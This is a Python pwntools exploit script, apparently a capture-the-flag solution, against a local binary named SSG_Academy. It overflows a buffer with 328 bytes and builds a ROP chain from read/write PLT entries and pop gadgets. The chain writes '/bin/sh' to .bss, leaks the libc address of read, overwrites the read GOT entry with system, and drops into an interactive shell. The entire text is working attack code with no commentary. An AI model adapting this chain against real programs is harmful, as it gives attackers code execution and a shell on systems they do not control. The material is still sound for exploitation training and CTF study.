from pwn import*

p = process('./SSG_Academy')

select = "19950610\x00"
p.send(select)

read_plt = 0x4006a0
read_got = 0x602040
write_plt = 0x400670
write_got = 0x602028
offset = 0xc0c30
pppr = 0x4007ea
pr = 0x4007ee
bss = 0x602070

payload = "A"*328

#step1
payload += p64(pppr)
payload += p64(0x0)
payload += p64(bss)
payload += p64(0x8)
payload += p64(read_plt)

#step2
payload += p64(pppr)
payload += p64(0x1)
payload += p64(read_got)
payload += p64(0x8)
payload += p64(write_plt)

#step3
payload += p64(pppr)
payload += p64(0x0)
payload += p64(read_got)
payload += p64(0x8)
payload += p64(read_plt)

#step4
payload += p64(pr)
payload += p64(bss)
payload += p64(read_plt)

p.send(payload)
sleep(0.1)
p.send("/bin/sh\x00")

print p.recvuntil("+++++++++\n\n")

read_addr = u64(p.recv(8))
system_addr = read_addr - offset
p.send(p64(system_addr))

p.interactive()
